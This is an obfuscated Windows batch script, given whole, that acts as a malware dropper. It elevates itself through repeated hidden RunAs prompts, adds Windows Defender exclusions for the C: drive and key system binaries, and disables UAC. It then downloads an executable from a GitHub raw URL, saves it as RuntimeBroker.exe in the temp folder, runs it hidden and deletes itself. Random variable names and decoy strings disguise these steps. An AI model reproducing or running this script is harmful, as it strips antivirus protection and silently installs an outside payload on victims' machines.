@echo off & setlocal enableDelayedExpansion
set "uhKFf=SESSION" & set "nxr=2>&1" & set "nWqU=>nul" & set "wzB=NET"
%wzB% %uhKFf% %nWqU% %nxr%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "jCPju=qux" & set "EpM=baz" & set "arx=bar" & set "cKpAt=foo" & rem Bpoyzm fufYqGa WBfyIJX
set "Uju=powershell -ExecutionPolicy Bypass -Command"
set "VcAQ=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "SlwC='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "MtoKS='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!Uju! "!VcAQ! !SlwC! !MtoKS!" %nWqU% %nxr%
set "BxfK=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "CDseW=-Name 'EnableLUA' -Value 0"
!Uju! "!BxfK! !CDseW!" %nWqU% %nxr%
set "AtvK=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!Uju! "!AtvK!" %nWqU% %nxr%
if !errorlevel! neq 0 (goto %a%)
set "tjt=timeout /t" & !tjt! 2 %nWqU% %nxr%
set "lZbwY=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "WWEO=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "Otgwz=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!Uju! "!lZbwY! !WWEO! !Otgwz!" %nWqU% %nxr%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!tjt! 1 %nWqU% %nxr% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %nWqU% %nxr%
del /f /q "%~f0" %nWqU% %nxr%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %nWqU% %nxr%
if !errorlevel! neq 0 (!tjt! 3 %nWqU% %nxr% & goto %b%)
exit /b
